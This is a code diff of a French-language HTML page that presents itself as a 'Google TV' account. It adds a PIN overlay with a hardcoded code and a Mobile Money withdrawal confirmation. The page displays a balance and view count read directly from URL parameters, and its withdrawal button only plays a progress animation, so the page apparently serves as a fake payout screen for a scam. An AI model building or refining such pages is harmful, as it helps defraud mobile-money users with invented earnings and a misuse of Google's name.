@@ -21,26 +21,113 @@ color:white;
 padding:20px;
 }
 
-/* TITRE */
+/* FENETRE PIN */
+
+#pinOverlay{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:#061a33;
+display:flex;
+justify-content:center;
+align-items:center;
+z-index:9999;
+padding:20px;
+}
+
+.pin-box{
+background:#0e2145;
+padding:25px;
+border-radius:20px;
+width:100%;
+max-width:350px;
+text-align:center;
+}
+
+.pin-box h2{
+margin-bottom:20px;
+font-size:20px;
+}
+
+.pin-box input{
+width:100%;
+padding:14px;
+border:none;
+border-radius:12px;
+background:#1a2d55;
+color:white;
+font-size:18px;
+text-align:center;
+margin-bottom:15px;
+}
+
+.pin-box button{
+width:100%;
+padding:14px;
+border:none;
+border-radius:12px;
+background:#20e38a;
+font-size:18px;
+font-weight:bold;
+cursor:pointer;
+}
+
+/* CONFIRMATION */
+
+#confirmationBox{
+display:none;
+background:#16a34a;
+padding:25px;
+border-radius:25px;
+text-align:center;
+margin-bottom:20px;
+}
+
+#confirmationBox h2{
+font-size:20px;
+line-height:40px;
+margin-bottom:25px;
+color:white;
+}
+
+#ouiBtn,
+#nonBtn{
+padding:14px 35px;
+border:none;
+border-radius:14px;
+font-size:18px;
+font-weight:bold;
+cursor:pointer;
+margin:10px;
+transition:0.3s;
+color:white;
+box-shadow:0 4px 10px rgba(0,0,0,0.2);
+}
+
+#ouiBtn{
+background:#0d6efd;
+}
+
+#nonBtn{
+background:#ff3b30;
+}
 
 h1{
 font-size:20px;
 margin-bottom:18px;
 }
 
-/* SOLDE */
-
 .solde-box{
 background:#4b4bd6;
 padding:18px;
 border-radius:18px;
 margin-bottom:18px;
-box-shadow:0 0 10px rgba(0,0,0,0.2);
 }
 
 .solde-titre{
 font-size:13px;
-color:#dcdcdc;
 margin-bottom:8px;
 font-weight:bold;
 }
@@ -48,17 +135,12 @@ font-weight:bold;
 .solde-montant{
 font-size:34px;
 font-weight:900;
-color:white;
-letter-spacing:1px;
 line-height:40px;
 }
 
 .solde-montant span{
 font-size:18px;
-font-weight:bold;
 }
-
-/* MESSAGE */
 
 .message{
 background:#0e2145;
@@ -71,8 +153,6 @@ font-weight:bold;
 line-height:24px;
 color:#32ff7e;
 }
-
-/* BLOCS */
 
 .stats{
 display:flex;
@@ -99,8 +179,6 @@ font-size:16px;
 font-weight:bold;
 }
 
-/* BOUTON */
-
 .btn{
 width:100%;
 background:#20e38a;
@@ -115,14 +193,10 @@ margin-bottom:20px;
 color:#03142d;
 }
 
-/* TITRE */
-
 .titre{
 font-size:14px;
 margin-bottom:10px;
 }
-
-/* RESEAUX */
 
 .reseaux{
 display:flex;
@@ -139,8 +213,6 @@ cursor:pointer;
 font-size:13px;
 }
 
-/* NUMERO */
-
 .numero-box{
 background:#0e2145;
 padding:16px;
@@ -149,8 +221,6 @@ margin-top:12px;
 line-height:26px;
 font-size:14px;
 }
-
-/* INPUT */
 
 input{
 width:100%;
@@ -164,8 +234,6 @@ outline:none;
 margin-bottom:15px;
 }
 
-/* PROGRESSION */
-
 .progress-zone{
 margin-top:22px;
 display:none;
@@ -176,8 +244,6 @@ font-size:13px;
 margin-bottom:10px;
 text-align:center;
 }
-
-/* ROND */
 
 .loader{
 width:40px;
@@ -194,8 +260,6 @@ margin:15px auto;
 transform:rotate(360deg);
 }
 }
-
-/* BARRE */
 
 .progress{
 width:100%;
@@ -216,70 +280,14 @@ font-size:8px;
 transition:0.3s;
 }
 
-/* TEMPS */
-
 #temps{
 margin-top:10px;
 font-size:12px;
 text-align:center;
 }
 
-/* POPUP */
-
-.popup{
-position:fixed;
-top:0;
-left:0;
-width:100%;
-height:100%;
-background:rgba(0,0,0,0.7);
-display:flex;
-justify-content:center;
-align-items:center;
-padding:20px;
-z-index:9999;
-}
-
-.popup-box{
-background:#0e2145;
-padding:30px;
-border-radius:25px;
-max-width:400px;
-width:100%;
-text-align:center;
-}
-
-.popup-text{
-color:#4da6ff;
-font-size:22px;
-font-weight:bold;
-line-height:35px;
-margin-bottom:30px;
-}
-
-.popup-buttons{
-display:flex;
-gap:15px;
-justify-content:center;
-}
-
-.popup-buttons button{
-border:none;
-padding:14px 35px;
-border-radius:15px;
-font-size:18px;
-font-weight:bold;
-cursor:pointer;
-}
-
-.oui{
-background:#20e38a;
-color:#03142d;
-}
-
-.non{
-background:red;
-color:white;
+#plateforme{
+display:none;
 }
 
 </style>
@@ -287,11 +295,53 @@ color:white;
 
 <body>
 
+<!-- PIN -->
+
+<div id="pinOverlay">
+
+<div class="pin-box">
+
+<h2>Code PIN de sécurité</h2>
+
+<input
+type="password"
+id="pinInput"
+placeholder="Entrez votre code"
+/>
+
+<button onclick="verifierPin()">
+Valider
+</button>
+
+</div>
+
+</div>
+
+<!-- MESSAGE -->
+
+<div id="confirmationBox">
+
+<h2>
+Souhaitez-vous réellement effectuer votre retrait par paiement Mobile Money ?
+</h2>
+
+<button id="ouiBtn">
+OUI
+</button>
+
+<button id="nonBtn">
+NON
+</button>
+
+</div>
+
+<!-- PLATEFORME -->
+
+<div id="plateforme">
+
 <h1>
 Bonjour, <span id="nom"></span>
 </h1>
-
-<!-- SOLDE -->
 
 <div class="solde-box">
 
@@ -301,19 +351,14 @@ Bonjour, <span id="nom"></span>
 
 <div class="solde-montant">
 <span id="solde"></span>
-
 <span>FCFA</span>
 </div>
 
 </div>
 
-<!-- MESSAGE -->
-
 <div class="message">
 Bienvenue sur votre compte Google TV, vos retraits sont directement validés sur votre numéro de retrait ✅
 </div>
-
-<!-- BLOCS -->
 
 <div class="stats">
 
@@ -329,13 +374,9 @@ Bienvenue sur votre compte Google TV, vos retraits sont directement validés sur
 
 </div>
 
-<!-- BOUTON -->
-
 <button class="btn" id="retrait">
 💸 RETIRER
 </button>
-
-<!-- RESEAUX -->
 
 <div class="titre">
 Choisir votre mode de retrait
@@ -361,28 +402,15 @@ Orange
 
 </div>
 
-<!-- NUMERO -->
-
 <div class="numero-box">
 
-<div style="
-font-size:14px;
-font-weight:bold;
-margin-bottom:10px;
-">
+<div style="font-size:14px;font-weight:bold;margin-bottom:10px;">
 Veuillez saisir numéro de retrait
 </div>
 
-<input
-type="text"
-placeholder="Entrez votre numéro"
-/>
+<input type="text" placeholder="Entrez votre numéro"/>
 
-<div style="
-font-size:14px;
-font-weight:bold;
-margin-bottom:5px;
-">
+<div style="font-size:14px;font-weight:bold;margin-bottom:5px;">
 Réseau :
 </div>
 
@@ -391,8 +419,6 @@ Aucun
 </span>
 
 </div>
-
-<!-- PROGRESSION -->
 
 <div class="progress-zone" id="zoneProgress">
 
@@ -416,76 +442,9 @@ Transaction vers numéro en cours...
 
 </div>
 
+</div>
+
 <script>
-
-/* CODE PIN */
-
-const vraiCode = "570998";
-
-/* DEMANDE CODE */
-
-let pin = prompt(
-"Veuillez entrer votre code PIN de sécurité"
-);
-
-/* SI FAUX */
-
-if(pin !== vraiCode){
-
-alert("Code PIN incorrect");
-
-document.body.innerHTML = `
-<div style="
-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-background:#061a33;
-color:white;
-font-size:28px;
-font-family:Arial;
-">
-Accès refusé
-</div>
-`;
-
-throw new Error("Accès bloqué");
-
-}
-
-/* MESSAGE UNE SEULE FOIS */
-
-document.body.insertAdjacentHTML("afterbegin", `
-
-<div class="popup" id="popupConfirmation">
-
-<div class="popup-box">
-
-<div class="popup-text">
-Souhaitez-vous réellement effectuer votre retrait par paiement Mobile Money ?
-</div>
-
-<div class="popup-buttons">
-
-<button class="oui"
-onclick="document.getElementById('popupConfirmation').style.display='none'">
-OUI
-</button>
-
-<button class="non"
-onclick="location.reload()">
-NON
-</button>
-
-</div>
-
-</div>
-
-</div>
-
-`);
-
-/* PARAMETRES */
 
 const params = new URLSearchParams(window.location.search);
 
@@ -498,6 +457,47 @@ params.get("solde") || "0";
 document.getElementById("vues").innerText =
 (params.get("vues") || "0") + " vues";
 
+/* PIN */
+
+function verifierPin(){
+
+const pin =
+document.getElementById("pinInput").value;
+
+if(pin === "570998"){
+
+document.getElementById("pinOverlay").style.display = "none";
+
+document.getElementById("confirmationBox").style.display = "block";
+
+}else{
+
+alert("Code incorrect");
+
+}
+
+}
+
+/* OUI */
+
+document.getElementById("ouiBtn")
+.addEventListener("click", function(){
+
+document.getElementById("confirmationBox").style.display = "none";
+
+document.getElementById("plateforme").style.display = "block";
+
+});
+
+/* NON */
+
+document.getElementById("nonBtn")
+.addEventListener("click", function(){
+
+location.reload();
+
+});
+
 /* RESEAU */
 
 function choisirReseau(reseau){
@@ -506,7 +506,7 @@ document.getElementById("reseauChoisi").innerText = reseau;
 
 }
 
-/* BOUTON */
+/* RETRAIT */
 
 const bouton = document.getElementById("retrait");
 
@@ -536,10 +536,6 @@ texte.innerHTML =
 texte.style.color = "white";
 
 bar.style.background = "green";
-
-bar.style.width = "0%";
-
-bar.innerHTML = "0%";
 
 const interval = setInterval(function(){
 
